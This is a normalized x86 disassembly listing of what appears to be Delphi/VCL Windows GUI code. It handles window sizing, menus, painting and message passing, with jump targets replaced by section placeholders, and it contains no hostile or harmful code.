mov ebx eax
mov eax ebx
call sub_4530b8
push eax
call IsIconic
test eax eax
je r-xdata
mov edx esi
mov eax ebx
call sub_453180
pop esi
pop ebx
retn
push 0x0
push 0x0
push 0x0
push 0x0
push esi
call SetRect
push 0xffffffec
mov eax ebx
call sub_4530b8
push eax
call GetWindowLongA
push eax
cmp [ ebx + 0x248 ] 0x0
setne al
neg al
sbb eax eax
push eax
push 0xfffffff0
mov eax ebx
call sub_4530b8
push eax
call GetWindowLongA
push eax
push esi
call AdjustWindowRectEx
mov eax [ ebx + 0x4c ]
sub eax [ esi + 0xc ]
add eax [ esi + 0x4 ]
push eax
mov eax [ ebx + 0x48 ]
sub eax [ esi + 0x8 ]
add eax [ esi ]
push eax
push 0x0
push 0x0
push esi
call SetRect
pop esi
pop ebx
retn
sub_466380
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov edx esi
mov eax ebx
call sub_45365c
cmp ebx esi
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
mov eax ebx
call sub_42156c
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec [ ebp - 0x8 ]
jne r-xdata
mov edx edi
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_421540
mov edi eax
mov eax edi
mov si 0xfff1
call sub_4034a4
test al al
jne r-xdata
sub_4663ec
push ebx
push esi
mov ebx eax
cmp [ ebx + 0xa0 ] 0x0
jne r-xdata
xor eax eax
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x58 ]
mov esi eax
mov eax ebx
call sub_4031f0
cmp esi eax
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_466418
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov ebp eax
mov eax [ esp ]
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
mov eax ebp
call sub_44fde8
sub [ esp + 0x4 ] eax
mov [ esp + 0x8 ] 0xffffffff
mov eax ebp
call sub_42156c
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
mov eax ebp
call sub_4536a4
jmp r-xdata
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
inc [ esp + 0x8 ]
mov eax [ esp + 0x8 ]
cmp eax [ esp + 0x4 ]
jne r-xdata
mov edx edi
mov eax ebp
call sub_421540
mov si 0xfff1
call sub_4034a4
test al al
jne r-xdata
mov edx edi
mov eax [ esp ]
call sub_42157c
jmp r-xdata
sub_4664ac
push ebx
mov ebx eax
cmp dl [ ebx + 0x60 ]
je r-xdata
pop ebx
retn
mov eax ebx
call sub_44ca5c
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax ebx
call sub_44da78
sub_4664d4
push ebx
mov ebx eax
test [ ebx + 0x54 ] 0x8
je r-xdata
mov eax ebx
call sub_44c290
pop ebx
retn
mov [ ebx + 0x268 ] edx
mov al [ r-xdata ]
or al [ ebx + 0x98 ]
mov [ ebx + 0x98 ] al
pop ebx
retn
sub_466504
push ebx
mov ebx eax
test [ ebx + 0x54 ] 0x8
je r-xdata
mov eax ebx
call sub_44c2d4
pop ebx
retn
mov [ ebx + 0x26c ] edx
mov al [ r-xdata ]
or al [ ebx + 0x98 ]
mov [ ebx + 0x98 ] al
pop ebx
retn
sub_466534
push ebx
push esi
mov ebx edx
mov esi eax
test [ esi + 0x2f4 ] 0x1
je r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
mov edx ebx
mov eax esi
call sub_44c794
cmp bl [ esi + 0x57 ]
je r-xdata
and [ esi + 0x2f4 ] 0xfd
pop esi
pop ebx
retn
or [ esi + 0x2f4 ] 0x2
jmp r-xdata
mov eax esi
call sub_46766c
pop esi
pop ebx
retn
sub_466578
push ebp
mov ebp esp
push 0x0
xor edx edx
push ebp
push sub_4665d1
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ eax + 0x22f ] 0x1
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4665d8
lea eax [ ebp - 0x4 ]
call sub_404038
retn
cmp [ eax + 0x57 ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405df8
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9d0
call sub_403a74
sub_4665e0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
cmp ebx esi
je r-xdata
test eax eax
jne r-xdata
mov edx esi
mov eax ebx
call sub_44c748
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
mov eax ebx
call sub_450610
mov eax ebx
call sub_4507ac
sub_466618
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_4213b8
cmp [ ebx + 0x250 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax [ ebx + 0x250 ]
mov ebx [ eax ]
call [ ebx + 0x2c ]
sub_466658
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebx ]
mov edx eax
cmp edx 0x46
jg r-xdata
sub edx 0xb01a
je r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xa0 ] 0x0
je r-xdata
dec edx
je r-xdata
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0x1c ]
and ax [ r-xdata ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
add edx 0xfffffffa
sub edx 0x3
jb r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_450acc
mov eax [ ebp - 0x4 ]
mov si 0xffb3
call sub_4034a4
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xa0 ] 0x0
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x230 ]
dec eax
sub al 0x2
jae r-xdata
cmp [ rw-data ] 0x0
je r-xdata
sub edx 0x22
je r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffb1
call sub_4034a4
jmp r-xdata
cmp eax [ rw-data ]
jne r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x230 ]
sub al 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22b ] 0x2
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebx ] 0x7
jne r-xdata
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
cmp [ eax ] 0x1
jne r-xdata
dec edx
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb025
mov eax [ ebp - 0x4 ]
call sub_44da78
push 0x0
xor ecx ecx
mov edx 0xb024
mov eax [ ebp - 0x4 ]
call sub_44da78
push 0x0
xor ecx ecx
mov edx 0xb035
mov eax [ ebp - 0x4 ]
call sub_44da78
push 0x0
xor ecx ecx
mov edx 0xb009
mov eax [ ebp - 0x4 ]
call sub_44da78
push 0x0
xor ecx ecx
mov edx 0xb008
mov eax [ ebp - 0x4 ]
call sub_44da78
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax [ ebp - 0x4 ]
call sub_44da78
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x229 ]
sub al 0x2
je r-xdata
sub al 0x2
jne r-xdata
mov eax [ ebx + 0x8 ]
or [ eax + 0x18 ] 0x2
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x248 ] 0x0
je r-xdata
mov esi [ ebx + 0x8 ]
cmp [ esi ] 0x1
jne r-xdata
jmp r-xdata
mov eax [ ebx + 0x8 ]
or [ eax + 0x18 ] 0x1
jmp r-xdata
sub al 0x3
jne r-xdata
xor esi esi
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x2
jne r-xdata
mov eax [ ebp - 0x14 ]
mov edx [ eax + 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x248 ]
xor ecx ecx
call sub_460584
mov edi eax
test edi edi
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x248 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_466f84
test eax eax
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_424e50
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_4668d1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x18 ]
push eax
call SaveDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4668b4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x14 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0xc ]
call sub_4255f0
mov eax [ rw-data ]
mov edx [ eax + 0x88 ]
mov eax [ ebp - 0xc ]
call sub_42546c
mov eax [ ebp - 0x14 ]
mov ax [ eax + 0x10 ]
push eax
mov eax [ ebp - 0x14 ]
lea ecx [ eax + 0x1c ]
mov edx [ ebp - 0xc ]
mov eax edi
call sub_461a6c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4668bb
xor edx edx
mov eax [ ebp - 0xc ]
call sub_4255f0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x18 ]
push eax
call RestoreDC
retn
mov edx [ esi + 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x248 ]
xor ecx ecx
call sub_460584
mov edi eax
test edi edi
je r-xdata
test esi esi
je r-xdata
cmp eax [ ebp - 0x4 ]
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_466f84
call sub_4530b8
mov esi eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4530b8
push eax
call GetWindowDC
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_4669ff
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_424e50
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_4669d8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
push eax
call SaveDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4669bb
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
call sub_4255f0
mov eax [ rw-data ]
mov edx [ eax + 0x88 ]
mov eax [ ebp - 0xc ]
call sub_42546c
lea eax [ esi + 0x10 ]
push eax
lea ecx [ esi + 0xc ]
mov edx [ ebp - 0xc ]
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x38 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4669c2
xor edx edx
mov eax [ ebp - 0xc ]
call sub_4255f0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call RestoreDC
retn
push esi
call SetFocus
jmp r-xdata
call sub_4530b8
mov esi eax
sub_4669df
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4530b8
push eax
call ReleaseDC
retn
sub_466a90
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x274 ]
push eax
call CallWindowProcA
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov [ edx + 0xc ] eax
pop ebp
retn
sub_466adc
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_466fb8
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov al 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx esi
call sub_467004
cmp [ eax + 0x22b ] 0x2
jne r-xdata
pop esi
pop ebx
pop ebp
retn
sub_466b1c
push ebp
mov ebp esp
add esp 0xffffff8c
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
sub eax 0xf
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
sub eax 0x5
je r-xdata
xor eax eax
push ebp
push sub_466cea
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0xc ] 0x0
jne r-xdata
lea eax [ ebp - 0x4c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
call BeginPaint
mov edx [ ebp - 0x8 ]
mov [ edx + 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x170 ]
call sub_424ca4
push eax
lea edx [ ebp - 0x6c ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ ebp - 0x6c ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
call FillRect
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x2
jne r-xdata
sub eax 0x2b
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_450d6c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
call GetWindowRect
lea ecx [ ebp - 0x74 ]
lea edx [ ebp - 0x5c ]
mov eax [ ebp - 0x4 ]
call sub_44c3b8
mov eax [ ebp - 0x74 ]
mov [ ebp - 0x5c ] eax
mov eax [ ebp - 0x70 ]
mov [ ebp - 0x58 ] eax
mov ecx [ ebp - 0x58 ]
neg ecx
mov edx [ ebp - 0x5c ]
neg edx
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
call sub_44b188
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x254 ] 0x0
je r-xdata
push ebp
call sub_466a90
pop ecx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x22f ] 0x2
jne r-xdata
sub eax 0x45
jne r-xdata
retn
lea eax [ ebp - 0x4c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
call EndPaint
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
call GetClientRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x170 ]
call sub_424ca4
push eax
lea eax [ ebp - 0x5c ]
push eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
call FillRect
mov eax [ ebp - 0x4 ]
call sub_466fb8
test eax eax
je r-xdata
push ebp
call sub_466a90
pop ecx
push ebp
call sub_466a90
pop ecx
mov eax [ ebp - 0x8 ]
cmp [ eax + 0xc ] 0x1
jne r-xdata
mov dl 0x1
push ebp
call sub_466adc
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0xffffffff
jmp r-xdata
xor edx edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
call sub_463dc0
jmp r-xdata
sub_466cfc
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi ecx
mov ebx eax
mov ecx esi
mov eax ebx
call sub_464fc4
mov eax [ ebx + 0x254 ]
test eax eax
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
push 0x14
mov ecx [ esi + 0xc ]
mov edi [ esi + 0x4 ]
sub ecx edi
push ecx
mov ecx [ esi + 0x8 ]
mov edx [ esi ]
sub ecx edx
push ecx
push edi
push edx
push 0x1
push eax
call SetWindowPos
cmp [ ebx + 0x22f ] 0x2
jne r-xdata
push esp
mov eax [ ebx + 0x254 ]
push eax
call GetClientRect
test eax eax
je r-xdata
push 0xffffffff
push 0x0
mov eax [ ebx + 0x254 ]
push eax
call InvalidateRect
sub_466d68
push ebx
push esi
push edi
push ecx
mov ebx eax
mov eax ebx
call sub_465660
mov eax ebx
call sub_4533bc
test al al
je r-xdata
mov eax ebx
call sub_42156c
mov edi eax
dec edi
test edi edi
jl r-xdata
push 0xffffffec
mov eax ebx
call sub_4530b8
push eax
call GetWindowLongA
and eax 0xffffefff
and eax 0xffffdfff
and eax 0xffffbfff
mov [ esp ] eax
mov edx esp
mov eax ebx
call sub_44fedc
mov eax [ esp ]
push eax
push 0xffffffec
mov eax ebx
call sub_4530b8
push eax
call SetWindowLongA
pop edx
pop edi
pop esi
pop ebx
retn
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax ebx
call sub_421540
call sub_4610c8
mov edx esi
mov eax ebx
call sub_421540
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
sub_466e00
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x244 ] 0x0
jne r-xdata
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x244 ] 0x1
xor edx edx
push ebp
push sub_466e7d
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x60 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x244 ] 0x0
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
test eax eax
jne r-xdata
mov dl [ eax + 0x5f ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x70 ]
mov eax [ rw-data ]
mov dl [ eax + 0x34 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x70 ]
jmp r-xdata
mov dl 0x1
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x6c ]
sub_466e88
push ebx
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ esp ]
cmp al [ ebx + 0x228 ]
je r-xdata
pop edx
pop ebx
retn
mov al [ esp ]
mov [ ebx + 0x228 ] al
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
call sub_450658
sub_466eb4
push esi
mov esi eax
cmp dl [ esi + 0x229 ]
je r-xdata
pop esi
retn
mov eax edx
mov [ esi + 0x229 ] al
sub al 0x2
je r-xdata
mov dl 0x1
sub al 0x3
je r-xdata
mov eax esi
call sub_450658
xor edx edx
jmp r-xdata
mov eax esi
call sub_465140
test [ esi + 0x1c ] 0x10
jne r-xdata
sub_466eec
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi ecx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov edi [ ebx + 0x30 ]
mov esi [ ebx + 0xa0 ]
mov ecx esp
mov eax ebx
call sub_44c050
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
cmp edi eax
jne r-xdata
cmp esi [ ebx + 0xa0 ]
je r-xdata
mov eax ebx
call sub_450658
sub_466f30
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp esi [ ebx + 0xa0 ]
je r-xdata
mov ecx edi
mov edx esi
mov eax ebx
call sub_44c15c
pop edi
pop esi
pop ebx
retn
test esi esi
je r-xdata
test esi esi
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
je r-xdata
mov al [ ebx + 0x229 ]
mov [ ebx + 0x280 ] al
mov [ ebx + 0x229 ] 0x0
mov al [ ebx + 0x280 ]
mov [ ebx + 0x229 ] al
jmp r-xdata
sub_466f84
push ebx
mov ebx eax
xor eax eax
cmp [ ebx + 0x22f ] 0x2
jne r-xdata
pop ebx
retn
cmp [ ebx + 0x254 ] 0x0
je r-xdata
push 0x0
push 0x0
push 0x229
mov eax [ ebx + 0x254 ]
push eax
call SendMessageA
call sub_4496d4
sub_466fb8
push ebx
push esi
push edi
xor edi edi
cmp [ eax + 0x22f ] 0x2
jne r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
cmp [ eax + 0x254 ] 0x0
je r-xdata
mov eax [ rw-data ]
call sub_46ab28
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
inc edi
mov edx esi
mov eax [ rw-data ]
call sub_46ab14
cmp [ eax + 0x22f ] 0x1
jne r-xdata
sub_467004
push ebx
push esi
push edi
mov edi edx
cmp [ eax + 0x22f ] 0x2
jne r-xdata
xor eax eax
cmp [ eax + 0x254 ] 0x0
je r-xdata
mov eax [ rw-data ]
call sub_46ab28
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
dec edi
test edi edi
jl r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_46ab14
cmp [ eax + 0x22f ] 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
sub_467054
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x14 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_403278
mov edx [ ebp + 0x8 ]
mov [ eax + 0x4 ] edx
mov edx [ ebx + 0x8 ]
mov [ eax + 0x8 ] edx
mov edx eax
mov eax ebx
call sub_418778
mov al 0x1
pop ebx
pop ebp
retn 0x10
sub_467084
push ebx
push esi
push edi
push ebp
push ecx
mov ebx eax
mov ebp rw-data
xor eax eax
mov [ esp ] eax
push 0x2
mov eax ebx
call sub_4530b8
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edi eax
mov eax [ ebp ]
call sub_46aaf8
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp ]
call sub_46aaf8
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
mov eax [ ebp ]
mov eax [ eax + 0x58 ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebp ]
mov eax [ eax + 0x58 ]
push eax
mov eax sub_467054
push eax
push 0x0
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov eax [ ebp ]
call sub_46aaf8
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp ]
call sub_46aae4
mov [ esp ] eax
jmp r-xdata
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov eax [ ebp ]
mov eax [ eax + 0x58 ]
mov edx esi
call sub_4188d4
call sub_4032a8
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp ]
call sub_46aae4
cmp edi [ eax + 0x4 ]
jne r-xdata
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp ]
call sub_46aae4
mov [ esp ] eax
jmp r-xdata
mov edx esi
mov eax [ ebp ]
call sub_46aae4
cmp edi [ eax + 0x4 ]
jne r-xdata
sub_467188
push ebx
mov ebx eax
mov eax ebx
call sub_467180
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x240 ]
call sub_42b51c
test eax eax
jne r-xdata
mov al 0x1
pop ebx
retn
sub_4671b0
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x22f ]
je r-xdata
pop esi
pop ebx
retn
cmp bl 0x1
jne r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
cmp [ esi + 0x230 ] 0x0
jne r-xdata
mov al [ esi + 0x22f ]
mov [ esi + 0x22f ] bl
cmp bl 0x2
je r-xdata
mov eax esi
call sub_450610
mov dl 0x1
mov eax esi
call sub_467514
cmp [ esi + 0x1a5 ] 0x0
jne r-xdata
cmp al 0x2
jne r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
mov eax esi
call sub_467590
mov edx eax
mov eax esi
call sub_44ca14
cmp bl 0x1
jne r-xdata
mov eax esi
call sub_4507ac
mov dl 0x1
mov eax esi
call sub_466534
sub_467230
push ebx
push esi
push edi
push ebp
mov ebp eax
cmp [ ebp + 0x22f ] 0x2
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ ebp + 0x254 ] 0x0
je r-xdata
xor esi esi
mov eax [ ebp + 0x248 ]
test eax eax
je r-xdata
xor edi edi
mov eax [ ebp + 0x258 ]
test eax eax
je r-xdata
mov edx [ eax ]
call [ edx + 0x34 ]
mov esi eax
mov eax ebp
call sub_4530b8
push eax
call GetMenu
cmp esi eax
setne bl
push edi
push esi
push 0x230
mov eax [ ebp + 0x254 ]
push eax
call SendMessageA
test bl bl
je r-xdata
call sub_45d6c4
mov edi eax
mov eax ebp
call sub_4530b8
push eax
call DrawMenuBar
sub_4672ac
push ebx
mov ebx edx
mov [ eax + 0x260 ] ebx
test ebx ebx
je r-xdata
pop ebx
retn
mov edx eax
mov eax ebx
call sub_421018
xor edx edx
mov eax ebx
call sub_45f05c
sub_4672d0
push ebx
mov ebx eax
cmp edx [ ebx + 0x258 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x258 ] edx
test edx edx
je r-xdata
mov eax ebx
call sub_467230
mov eax edx
mov edx ebx
call sub_421018
sub_4672f8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4674be
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
je r-xdata
mov eax [ ebx + 0x248 ]
test eax eax
je r-xdata
mov eax [ rw-data ]
call sub_46ab28
dec eax
test eax eax
jl r-xdata
test [ ebx + 0x1c ] 0x8
jne r-xdata
xor edx edx
call sub_460c10
inc eax
mov [ ebp - 0x4 ] eax
xor edi edi
xor esi esi
test esi esi
je r-xdata
inc edi
dec [ ebp - 0x4 ]
jne r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_46ab14
cmp ebx eax
je r-xdata
test esi esi
je r-xdata
mov edx ebx
mov eax esi
call sub_421018
mov [ ebx + 0x248 ] esi
test esi esi
je r-xdata
test [ esi + 0x1c ] 0x8
je r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_46ab14
cmp esi [ eax + 0x248 ]
jne r-xdata
mov eax [ esi + 0x8 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0xc ]
push eax
push 0x0
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405df8
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba0c
call sub_403a74
mov eax ebx
call sub_4533bc
test al al
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp [ ebx + 0x22e ] 0x0
je r-xdata
push 0x0
mov eax ebx
call sub_4530b8
push eax
call SetMenu
mov eax [ ebx + 0x248 ]
cmp [ eax + 0x5c ] 0x0
jne r-xdata
cmp [ ebx + 0x229 ] 0x3
je r-xdata
mov eax ebx
call sub_467230
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4674c5
lea eax [ ebp - 0x10 ]
call sub_404038
retn
mov dl 0x1
mov eax ebx
call sub_4683bc
test [ ebx + 0x1c ] 0x10
je r-xdata
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
cmp [ ebx + 0x22f ] 0x1
je r-xdata
mov eax ebx
call sub_4533bc
test al al
je r-xdata
mov eax ebx
call sub_4533bc
test al al
je r-xdata
mov eax [ ebx + 0x248 ]
mov edx [ eax ]
call [ edx + 0x34 ]
mov edi eax
mov eax ebx
call sub_4530b8
push eax
call GetMenu
cmp edi eax
je r-xdata
push 0x0
mov eax ebx
call sub_4530b8
push eax
call SetMenu
jmp r-xdata
mov eax ebx
call sub_4530b8
mov edx eax
mov eax esi
call sub_460c10
jmp r-xdata
mov eax [ ebx + 0x248 ]
mov edx [ eax ]
call [ edx + 0x34 ]
push eax
mov eax ebx
call sub_4530b8
